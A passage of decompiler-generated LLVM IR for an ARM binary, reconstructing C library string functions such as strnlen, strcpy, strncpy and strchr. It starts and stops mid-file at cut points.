  uselistorder label %dec_label_pc_11b64.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11bec = icmp eq i32 %arg2, 0
  br i1 %v2_11bec, label %bb, label %dec_label_pc_11c00

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_11c00:                               ; preds = %entry
  %v2_11c00 = add i32 %tmp, %arg2
  %v3_11c00 = icmp ult i32 %v2_11c00, %tmp
  br i1 %v3_11c00, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11c00
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11c00, %bb19
  %v5_11ca0 = phi i32 [ %v2_11c00, %dec_label_pc_11c00 ], [ -1, %bb19 ]
  %v1_11c204 = urem i32 %tmp, 4
  %v2_11c205 = icmp eq i32 %v1_11c204, 0
  br i1 %v2_11c205, label %dec_label_pc_11c28, label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %bb20, %dec_label_pc_11c1c
  %v0_11c1c = phi i32 [ %v1_11c1c, %dec_label_pc_11c1c ], [ %tmp, %bb20 ]
  %v1_11c10 = inttoptr i32 %v0_11c1c to i8*
  %v2_11c10 = load i8, i8* %v1_11c10, align 1
  %v2_11c14 = icmp eq i8 %v2_11c10, 0
  br i1 %v2_11c14, label %dec_label_pc_11c9c, label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c10
  %v1_11c1c = add i32 %v0_11c1c, 1
  %v1_11c20 = urem i32 %v1_11c1c, 4
  %v2_11c20 = icmp eq i32 %v1_11c20, 0
  br i1 %v2_11c20, label %dec_label_pc_11c28, label %dec_label_pc_11c10

dec_label_pc_11c28:                               ; preds = %dec_label_pc_11c1c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_11c1c, %dec_label_pc_11c1c ]
  %v3_11c8c30 = icmp ult i32 %storemerge.lcssa, %v5_11ca0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_11c8c30, label %dec_label_pc_11c30, label %dec_label_pc_11c9c

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11c88, %dec_label_pc_11c28
  %v0_11c8037 = phi i32 [ %v4_11c30, %dec_label_pc_11c88 ], [ %storemerge.lcssa, %dec_label_pc_11c28 ]
  %v1_11c30 = inttoptr i32 %v0_11c8037 to i32*
  %v2_11c30 = load i32, i32* %v1_11c30, align 4
  %v4_11c30 = add i32 %v0_11c8037, 4
  %v2_11c34 = add i32 %v2_11c30, -16843009
  %v2_11c38 = and i32 %v2_11c34, -2139062144
  store i32 %v2_11c38, i32* @ip, align 4
  %v2_11c3c = icmp eq i32 %v2_11c38, 0
  br i1 %v2_11c3c, label %dec_label_pc_11c88, label %dec_label_pc_11c44

dec_label_pc_11c44:                               ; preds = %dec_label_pc_11c30
  %v2_11c44 = inttoptr i32 %v0_11c8037 to i8*
  %v3_11c44 = load i8, i8* %v2_11c44, align 1
  %v2_11c48 = icmp eq i8 %v3_11c44, 0
  br i1 %v2_11c48, label %bb21, label %dec_label_pc_11c58

bb21:                                             ; preds = %dec_label_pc_11c44
  br label %dec_label_pc_11c9c

dec_label_pc_11c58:                               ; preds = %dec_label_pc_11c44
  %v1_11c58 = add i32 %v0_11c8037, 1
  %v2_11c58 = inttoptr i32 %v1_11c58 to i8*
  %v3_11c58 = load i8, i8* %v2_11c58, align 1
  %v2_11c5c = icmp eq i8 %v3_11c58, 0
  br i1 %v2_11c5c, label %dec_label_pc_11c9c, label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c58
  %v1_11c68 = add i32 %v0_11c8037, 2
  %v2_11c68 = inttoptr i32 %v1_11c68 to i8*
  %v3_11c68 = load i8, i8* %v2_11c68, align 1
  %v2_11c6c = icmp eq i8 %v3_11c68, 0
  br i1 %v2_11c6c, label %dec_label_pc_11c9c, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c68
  %v1_11c78 = add i32 %v0_11c8037, 3
  %v2_11c78 = inttoptr i32 %v1_11c78 to i8*
  %v3_11c78 = load i8, i8* %v2_11c78, align 1
  %v2_11c7c = icmp eq i8 %v3_11c78, 0
  br i1 %v2_11c7c, label %dec_label_pc_11c9c, label %dec_label_pc_11c88

dec_label_pc_11c88:                               ; preds = %dec_label_pc_11c78, %dec_label_pc_11c30
  %v3_11c8c = icmp ult i32 %v4_11c30, %v5_11ca0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_11c8c, label %dec_label_pc_11c30, label %dec_label_pc_11c9c

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c88, %dec_label_pc_11c28, %dec_label_pc_11c10, %dec_label_pc_11c58, %dec_label_pc_11c68, %dec_label_pc_11c78, %bb21
  %v1_11c9c = phi i32 [ %v0_11c8037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_11c28 ], [ %v1_11c58, %dec_label_pc_11c58 ], [ %v1_11c68, %dec_label_pc_11c68 ], [ %v1_11c78, %dec_label_pc_11c78 ], [ %v5_11ca0, %dec_label_pc_11c88 ], [ %v0_11c1c, %dec_label_pc_11c10 ]
  %v3_11c9c = icmp uge i32 %v5_11ca0, %v1_11c9c
  %v9_11c9c = icmp eq i32 %v5_11ca0, %v1_11c9c
  %v2_11ca0 = xor i1 %v3_11c9c, true
  %v3_11ca0 = or i1 %v9_11c9c, %v2_11ca0
  br i1 %v3_11ca0, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_11c9c
  %v6_11ca0 = sub i32 %v5_11ca0, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_11c9c, %bb22
  %v5_11ca4 = phi i32 [ %v1_11c9c, %dec_label_pc_11c9c ], [ %v6_11ca0, %bb22 ]
  %v2_11ca4 = xor i1 %v9_11c9c, true
  %v3_11ca4 = and i1 %v3_11c9c, %v2_11ca4
  br i1 %v3_11ca4, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_11ca4 = sub i32 %v5_11ca4, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_11cac = phi i32 [ 0, %bb ], [ %v5_11ca4, %bb23 ], [ %v6_11ca4, %bb24 ]
  ret i32 %v1_11cac

; uselistorder directives
  uselistorder i1 %v3_11c9c, { 1, 0 }
  uselistorder i32 %v4_11c30, { 1, 0 }
  uselistorder i32 %v0_11c8037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11c1c, { 1, 0, 2 }
  uselistorder i32 %v5_11ca0, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_11c9c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_11c10, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11cc81 = load i32, i32* @r1, align 4
  %v1_11cc82 = inttoptr i32 %v0_11cc81 to i8*
  %v2_11cc83 = load i8, i8* %v1_11cc82, align 1
  %v2_11ccc5 = icmp eq i8 %v2_11cc83, 0
  store i1 %v2_11ccc5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11cc83, i8* %arg1, align 1
  br i1 %v2_11ccc5, label %dec_label_pc_11cd8, label %dec_label_pc_11cc0

dec_label_pc_11cc0:                               ; preds = %entry, %dec_label_pc_11cc0
  %v0_11cc0 = load i32, i32* @r1, align 4
  %v1_11cc0 = add i32 %v0_11cc0, 1
  store i32 %v1_11cc0, i32* @r1, align 4
  %v0_11cc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11cc4 = add i32 %v0_11cc4, 1
  store i32 %v1_11cc4, i32* %r2.global-to-local, align 4
  %v1_11cc8 = inttoptr i32 %v1_11cc0 to i8*
  %v2_11cc8 = load i8, i8* %v1_11cc8, align 1
  %v2_11ccc = icmp eq i8 %v2_11cc8, 0
  store i1 %v2_11ccc, i1* %cpsr_z.global-to-local, align 1
  %v3_11cd0 = inttoptr i32 %v1_11cc4 to i8*
  store i8 %v2_11cc8, i8* %v3_11cd0, align 1
  %v0_11cd4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11cd4, label %dec_label_pc_11cd8, label %dec_label_pc_11cc0

dec_label_pc_11cd8:                               ; preds = %dec_label_pc_11cc0, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11cc0, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_11cdc = icmp eq i32 %arg2, 3
  store i1 %v7_11cdc, i1* %cpsr_z.global-to-local, align 1
  %v0_11ce0 = load i32, i32* @lr, align 4
  store i32 %v0_11ce0, i32* %stack_var_-4, align 4
  %v1_11ce4 = add i32 %arg1, -1
  store i32 %v1_11ce4, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_11d60, label %dec_label_pc_11cec

dec_label_pc_11cec:                               ; preds = %entry
  %v3_11cec = udiv i32 %arg2, 4
  store i32 %v3_11cec, i32* %lr.global-to-local, align 4
  %v0_11cf0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11d3c, %dec_label_pc_11cec
  %v2_11cf8 = phi i32 [ %v6_11d30, %dec_label_pc_11d3c ], [ %v1_11ce4, %dec_label_pc_11cec ]
  %v0_11cf0 = phi i32 [ %v1_11d40, %dec_label_pc_11d3c ], [ %v0_11cf0.pre, %dec_label_pc_11cec ]
  %v1_11cf0 = inttoptr i32 %v0_11cf0 to i8*
  %v2_11cf0 = load i8, i8* %v1_11cf0, align 1
  %v3_11cf0 = zext i8 %v2_11cf0 to i32
  store i32 %v3_11cf0, i32* %r3.global-to-local, align 4
  %v2_11cf4 = icmp eq i8 %v2_11cf0, 0
  store i1 %v2_11cf4, i1* %cpsr_z.global-to-local, align 1
  %v3_11cf8 = add i32 %v2_11cf8, 1
  %v4_11cf8 = inttoptr i32 %v3_11cf8 to i8*
  store i8 %v2_11cf0, i8* %v4_11cf8, align 1
  %v5_11cf8 = load i32, i32* @ip, align 4
  %v6_11cf8 = add i32 %v5_11cf8, 1
  store i32 %v6_11cf8, i32* @ip, align 4
  %v0_11cfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11cfc, label %dec_label_pc_11d4c, label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11cf0
  %v0_11d00 = load i32, i32* @r1, align 4
  %v1_11d00 = add i32 %v0_11d00, 1
  %v2_11d00 = inttoptr i32 %v1_11d00 to i8*
  %v3_11d00 = load i8, i8* %v2_11d00, align 1
  %v4_11d00 = zext i8 %v3_11d00 to i32
  store i32 %v4_11d00, i32* %r3.global-to-local, align 4
  %v2_11d04 = icmp eq i8 %v3_11d00, 0
  store i1 %v2_11d04, i1* %cpsr_z.global-to-local, align 1
  %v3_11d08 = add i32 %v5_11cf8, 2
  %v4_11d08 = inttoptr i32 %v3_11d08 to i8*
  store i8 %v3_11d00, i8* %v4_11d08, align 1
  %v5_11d08 = load i32, i32* @ip, align 4
  %v6_11d08 = add i32 %v5_11d08, 1
  store i32 %v6_11d08, i32* @ip, align 4
  %v0_11d0c = load i32, i32* @r1, align 4
  %v1_11d0c = add i32 %v0_11d0c, 1
  store i32 %v1_11d0c, i32* %r1.global-to-local, align 4
  %v0_11d10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d10, label %dec_label_pc_11d4c, label %dec_label_pc_11d14

dec_label_pc_11d14:                               ; preds = %dec_label_pc_11d00
  %v1_11d14 = add i32 %v0_11d0c, 2
  %v2_11d14 = inttoptr i32 %v1_11d14 to i8*
  %v3_11d14 = load i8, i8* %v2_11d14, align 1
  %v4_11d14 = zext i8 %v3_11d14 to i32
  store i32 %v4_11d14, i32* %r3.global-to-local, align 4
  %v2_11d18 = icmp eq i8 %v3_11d14, 0
  store i1 %v2_11d18, i1* %cpsr_z.global-to-local, align 1
  %v3_11d1c = add i32 %v5_11d08, 2
  %v4_11d1c = inttoptr i32 %v3_11d1c to i8*
  store i8 %v3_11d14, i8* %v4_11d1c, align 1
  %v5_11d1c = load i32, i32* @ip, align 4
  %v6_11d1c = add i32 %v5_11d1c, 1
  store i32 %v6_11d1c, i32* @ip, align 4
  %v0_11d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d20 = add i32 %v0_11d20, 1
  store i32 %v1_11d20, i32* %r1.global-to-local, align 4
  %v0_11d24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d24, label %dec_label_pc_11d4c, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d14
  %v1_11d28 = add i32 %v0_11d20, 2
  %v2_11d28 = inttoptr i32 %v1_11d28 to i8*
  %v3_11d28 = load i8, i8* %v2_11d28, align 1
  %v4_11d28 = zext i8 %v3_11d28 to i32
  store i32 %v4_11d28, i32* %r3.global-to-local, align 4
  %v2_11d2c = icmp eq i8 %v3_11d28, 0
  store i1 %v2_11d2c, i1* %cpsr_z.global-to-local, align 1
  %v3_11d30 = add i32 %v5_11d1c, 2
  %v4_11d30 = inttoptr i32 %v3_11d30 to i8*
  store i8 %v3_11d28, i8* %v4_11d30, align 1
  %v5_11d30 = load i32, i32* @ip, align 4
  %v6_11d30 = add i32 %v5_11d30, 1
  store i32 %v6_11d30, i32* @ip, align 4
  %v0_11d34 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d34 = add i32 %v0_11d34, 1
  store i32 %v1_11d34, i32* %r1.global-to-local, align 4
  %v0_11d38 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d38, label %dec_label_pc_11d4c, label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d28
  %v0_11d3c = load i32, i32* %lr.global-to-local, align 4
  %v1_11d3c = add i32 %v0_11d3c, -1
  store i32 %v1_11d3c, i32* %lr.global-to-local, align 4
  %v7_11d3c = icmp eq i32 %v0_11d3c, 1
  store i1 %v7_11d3c, i1* %cpsr_z.global-to-local, align 1
  %v1_11d40 = add i32 %v0_11d34, 2
  store i32 %v1_11d40, i32* @r1, align 4
  br i1 %v7_11d3c, label %dec_label_pc_11d60, label %dec_label_pc_11cf0

dec_label_pc_11d4c:                               ; preds = %dec_label_pc_11d28, %dec_label_pc_11d14, %dec_label_pc_11d00, %dec_label_pc_11cf0
  %v1_11d4c = phi i32 [ %v6_11d30, %dec_label_pc_11d28 ], [ %v6_11d1c, %dec_label_pc_11d14 ], [ %v6_11d08, %dec_label_pc_11d00 ], [ %v6_11cf8, %dec_label_pc_11cf0 ]
  %v2_11d4c1 = sub i32 %arg1, %v1_11d4c
  %v2_11d50 = add i32 %v2_11d4c1, %arg2
  %v1_11d54 = add i32 %v2_11d50, -1
  store i32 %v1_11d54, i32* %r3.global-to-local, align 4
  %v7_11d54 = icmp eq i32 %v2_11d50, 1
  store i1 %v7_11d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d54, label %dec_label_pc_11d90, label %dec_label_pc_11d80

dec_label_pc_11d60:                               ; preds = %dec_label_pc_11d3c, %entry
  %v2_11d707 = phi i32 [ %v1_11ce4, %entry ], [ %v6_11d30, %dec_label_pc_11d3c ]
  %v1_11d60 = urem i32 %arg2, 4
  store i32 %v1_11d60, i32* %r3.global-to-local, align 4
  %v2_11d60 = icmp eq i32 %v1_11d60, 0
  store i1 %v2_11d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d60, label %dec_label_pc_11d90, label %dec_label_pc_11d68

dec_label_pc_11d68:                               ; preds = %dec_label_pc_11d60, %dec_label_pc_11d78.dec_label_pc_11d68_crit_edge
  %v2_11d70 = phi i32 [ %v6_11d70, %dec_label_pc_11d78.dec_label_pc_11d68_crit_edge ], [ %v2_11d707, %dec_label_pc_11d60 ]
  %v0_11d6c = phi i32 [ %v0_11d6c.pre, %dec_label_pc_11d78.dec_label_pc_11d68_crit_edge ], [ %v1_11d60, %dec_label_pc_11d60 ]
  %v0_11d68 = load i32, i32* @r1, align 4
  %v1_11d68 = inttoptr i32 %v0_11d68 to i8*
  %v2_11d68 = load i8, i8* %v1_11d68, align 1
  %v3_11d68 = zext i8 %v2_11d68 to i32
  store i32 %v3_11d68, i32* %r2.global-to-local, align 4
  %v5_11d68 = add i32 %v0_11d68, 1
  store i32 %v5_11d68, i32* @r1, align 4
  %v1_11d6c = add i32 %v0_11d6c, -1
  store i32 %v1_11d6c, i32* %r3.global-to-local, align 4
  %v7_11d6c = icmp eq i32 %v0_11d6c, 1
  store i1 %v7_11d6c, i1* %cpsr_z.global-to-local, align 1
  %v3_11d70 = add i32 %v2_11d70, 1
  %v4_11d70 = inttoptr i32 %v3_11d70 to i8*
  store i8 %v2_11d68, i8* %v4_11d70, align 1
  %v5_11d70 = load i32, i32* @ip, align 4
  %v6_11d70 = add i32 %v5_11d70, 1
  store i32 %v6_11d70, i32* @ip, align 4
  %v0_11d74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d74, label %dec_label_pc_11d90, label %dec_label_pc_11d78

dec_label_pc_11d78:                               ; preds = %dec_label_pc_11d68
  %v0_11d78 = load i32, i32* %r2.global-to-local, align 4
  %v2_11d78 = icmp eq i32 %v0_11d78, 0
  store i1 %v2_11d78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d78, label %dec_label_pc_11d80, label %dec_label_pc_11d78.dec_label_pc_11d68_crit_edge

dec_label_pc_11d78.dec_label_pc_11d68_crit_edge:  ; preds = %dec_label_pc_11d78
  %v0_11d6c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11d68

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d78, %dec_label_pc_11d4c
  %v2_11d8810 = phi i32 [ %v1_11d4c, %dec_label_pc_11d4c ], [ %v6_11d70, %dec_label_pc_11d78 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d84.dec_label_pc_11d84_crit_edge, %dec_label_pc_11d80
  %v2_11d88 = phi i32 [ %v6_11d88, %dec_label_pc_11d84.dec_label_pc_11d84_crit_edge ], [ %v2_11d8810, %dec_label_pc_11d80 ]
  %v0_11d88.off0 = phi i8 [ %extract.t, %dec_label_pc_11d84.dec_label_pc_11d84_crit_edge ], [ 0, %dec_label_pc_11d80 ]
  %v0_11d84 = load i32, i32* %r3.global-to-local, align 4
  %v1_11d84 = add i32 %v0_11d84, -1
  store i32 %v1_11d84, i32* %r3.global-to-local, align 4
  %v7_11d84 = icmp eq i32 %v0_11d84, 1
  store i1 %v7_11d84, i1* %cpsr_z.global-to-local, align 1
  %v3_11d88 = add i32 %v2_11d88, 1
  %v4_11d88 = inttoptr i32 %v3_11d88 to i8*
  store i8 %v0_11d88.off0, i8* %v4_11d88, align 1
  %v5_11d88 = load i32, i32* @ip, align 4
  %v6_11d88 = add i32 %v5_11d88, 1
  store i32 %v6_11d88, i32* @ip, align 4
  %v0_11d8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d8c, label %dec_label_pc_11d90, label %dec_label_pc_11d84.dec_label_pc_11d84_crit_edge

dec_label_pc_11d84.dec_label_pc_11d84_crit_edge:  ; preds = %dec_label_pc_11d84
  %v0_11d88.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_11d88.pre to i8
  br label %dec_label_pc_11d84

dec_label_pc_11d90:                               ; preds = %dec_label_pc_11d68, %dec_label_pc_11d84, %dec_label_pc_11d4c, %dec_label_pc_11d60
  %v2_11d90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_11d90, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11d88, { 1, 0 }
  uselistorder i32 %v0_11d84, { 1, 0 }
  uselistorder i32 %v6_11d70, { 0, 2, 1 }
  uselistorder i32 %v1_11d60, { 2, 1, 0 }
  uselistorder i32 %v2_11d50, { 1, 0 }
  uselistorder i32 %v1_11d40, { 1, 0 }
  uselistorder i32 %v0_11d3c, { 1, 0 }
  uselistorder i32 %v6_11d30, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d90, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_11d68, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11d9c = urem i32 %arg1, 256
  %v0_11dbc3 = load i32, i32* @r0, align 4
  %v1_11dbc4 = urem i32 %v0_11dbc3, 4
  %v2_11dbc5 = icmp eq i32 %v1_11dbc4, 0
  br i1 %v2_11dbc5, label %dec_label_pc_11dc4, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %entry, %dec_label_pc_11db8
  %v0_11db8 = phi i32 [ %v1_11db8, %dec_label_pc_11db8 ], [ %v0_11dbc3, %entry ]
  %v1_11da4 = inttoptr i32 %v0_11db8 to i8*
  %v2_11da4 = load i8, i8* %v1_11da4, align 1
  %v3_11da4 = zext i8 %v2_11da4 to i32
  store i32 %v3_11da4, i32* @r3, align 4
  %v9_11da8 = icmp eq i32 %v3_11da4, %v1_11d9c
  br i1 %v9_11da8, label %dec_label_pc_11e78, label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11da4
  %v2_11db0 = icmp eq i8 %v2_11da4, 0
  br i1 %v2_11db0, label %dec_label_pc_11e74, label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11db0
  %v1_11db8 = add i32 %v0_11db8, 1
  %v1_11dbc = urem i32 %v1_11db8, 4
  %v2_11dbc = icmp eq i32 %v1_11dbc, 0
  br i1 %v2_11dbc, label %dec_label_pc_11dc4, label %dec_label_pc_11da4

dec_label_pc_11dc4:                               ; preds = %dec_label_pc_11db8, %entry
  %v0_11dc8 = phi i32 [ %v0_11dbc3, %entry ], [ %v1_11db8, %dec_label_pc_11db8 ]
  %v4_11dc4 = mul nuw nsw i32 %v1_11d9c, 256
  %v5_11dc4 = or i32 %v4_11dc4, %v1_11d9c
  %v4_11dcc = mul i32 %v5_11dc4, 65536
  %v5_11dcc = or i32 %v4_11dcc, %v5_11dc4
  br label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %dec_label_pc_11e6c, %dec_label_pc_11e0c, %dec_label_pc_11dc4
  %v0_11e34 = phi i32 [ %v0_11dc8, %dec_label_pc_11dc4 ], [ %v4_11dd0, %dec_label_pc_11e0c ], [ %v4_11dd0, %dec_label_pc_11e6c ]
  %v1_11dd0 = inttoptr i32 %v0_11e34 to i32*
  %v2_11dd0 = load i32, i32* %v1_11dd0, align 4
  %v4_11dd0 = add i32 %v0_11e34, 4
  %v2_11dd8 = xor i32 %v2_11dd0, %v5_11dcc
  %v2_11ddc = add i32 %v2_11dd8, 2130640639
  store i32 %v2_11ddc, i32* @ip, align 4
  %v2_11de4 = add i32 %v2_11dd0, 2130640639
  %v1_11de8 = sub i32 -1, %v2_11dd0
  %v2_11dec = xor i32 %v2_11de4, %v1_11de8
  %v2_11df8 = and i32 %v2_11dec, -2130640640
  %v2_11e00 = icmp eq i32 %v2_11df8, 0
  br i1 %v2_11e00, label %dec_label_pc_11e0c, label %dec_label_pc_11e14

dec_label_pc_11e0c:                               ; preds = %dec_label_pc_11dd0
  %v1_11df4 = sub i32 -1, %v2_11dd8
  %v2_11dfc = xor i32 %v2_11ddc, %v1_11df4
  %v2_11e04 = and i32 %v2_11dfc, -2130640640
  %v2_11e0c = icmp eq i32 %v2_11e04, 0
  br i1 %v2_11e0c, label %dec_label_pc_11dd0, label %dec_label_pc_11e14

dec_label_pc_11e14:                               ; preds = %dec_label_pc_11dd0, %dec_label_pc_11e0c
  %v2_11e14 = inttoptr i32 %v0_11e34 to i8*
  %v3_11e14 = load i8, i8* %v2_11e14, align 1
  %v4_11e14 = zext i8 %v3_11e14 to i32
  store i32 %v4_11e14, i32* @r3, align 4
  %v9_11e18 = icmp eq i32 %v4_11e14, %v1_11d9c
  br i1 %v9_11e18, label %dec_label_pc_11e78, label %dec_label_pc_11e24

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11e14
  %v2_11e24 = icmp eq i8 %v3_11e14, 0
  br i1 %v2_11e24, label %dec_label_pc_11e74, label %dec_label_pc_11e2c

dec_label_pc_11e2c:                               ; preds = %dec_label_pc_11e24
  %v1_11e2c = add i32 %v0_11e34, 1
  %v2_11e2c = inttoptr i32 %v1_11e2c to i8*
  %v3_11e2c = load i8, i8* %v2_11e2c, align 1
  %v4_11e2c = zext i8 %v3_11e2c to i32
  store i32 %v4_11e2c, i32* @r3, align 4
  %v9_11e30 = icmp eq i32 %v4_11e2c, %v1_11d9c
  br i1 %v9_11e30, label %dec_label_pc_11e78, label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e2c
  %v2_11e3c = icmp eq i8 %v3_11e2c, 0
  br i1 %v2_11e3c, label %dec_label_pc_11e74, label %dec_label_pc_11e44

dec_label_pc_11e44:                               ; preds = %dec_label_pc_11e3c
  %v1_11e44 = add i32 %v0_11e34, 2
  %v2_11e44 = inttoptr i32 %v1_11e44 to i8*
  %v3_11e44 = load i8, i8* %v2_11e44, align 1
  %v4_11e44 = zext i8 %v3_11e44 to i32
  store i32 %v4_11e44, i32* @r3, align 4
  %v9_11e48 = icmp eq i32 %v4_11e44, %v1_11d9c
  br i1 %v9_11e48, label %dec_label_pc_11e78, label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e44
  %v2_11e54 = icmp eq i8 %v3_11e44, 0
  br i1 %v2_11e54, label %dec_label_pc_11e74, label %dec_label_pc_11e5c

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e54
  %v1_11e5c = add i32 %v0_11e34, 3
  %v2_11e5c = inttoptr i32 %v1_11e5c to i8*
  %v3_11e5c = load i8, i8* %v2_11e5c, align 1
  %v4_11e5c = zext i8 %v3_11e5c to i32
  store i32 %v4_11e5c, i32* @r3, align 4
  %v9_11e60 = icmp eq i32 %v4_11e5c, %v1_11d9c
  br i1 %v9_11e60, label %dec_label_pc_11e78, label %dec_label_pc_11e6c

dec_label_pc_11e6c:                               ; preds = %dec_label_pc_11e5c
  %v2_11e6c = icmp eq i8 %v3_11e5c, 0
  br i1 %v2_11e6c, label %dec_label_pc_11e74, label %dec_label_pc_11dd0

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11db0, %dec_label_pc_11e6c, %dec_label_pc_11e54, %dec_label_pc_11e3c, %dec_label_pc_11e24
  br label %dec_label_pc_11e78

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11da4, %dec_label_pc_11e5c, %dec_label_pc_11e44, %dec_label_pc_11e2c, %dec_label_pc_11e14, %dec_label_pc_11e74
  %v1_11e7c = phi i32 [ 0, %dec_label_pc_11e74 ], [ %v1_11e5c, %dec_label_pc_11e5c ], [ %v1_11e44, %dec_label_pc_11e44 ], [ %v1_11e2c, %dec_label_pc_11e2c ], [ %v0_11e34, %dec_label_pc_11e14 ], [ %v0_11db8, %dec_label_pc_11da4 ]
  ret i32 %v1_11e7c

; uselistorder directives
  uselistorder i32 %v4_11dd0, { 1, 0 }
  uselistorder i32 %v2_11dd0, { 0, 2, 1 }
  uselistorder i32 %v0_11e34, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_11dc4, { 1, 0 }
  uselistorder i32 %v1_11db8, { 1, 0, 2 }
  uselistorder i32 %v0_11dbc3, { 2, 1, 0 }
  uselistorder i32 %v1_11d9c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11e78, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11e74, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11e14, { 1, 0 }
  uselistorder label %dec_label_pc_11da4, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11e90 = call i32 @__xpg_strerror_r()
  %v0_11e94 = load i32, i32* @r4, align 4
  ret i32 %v0_11e94
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
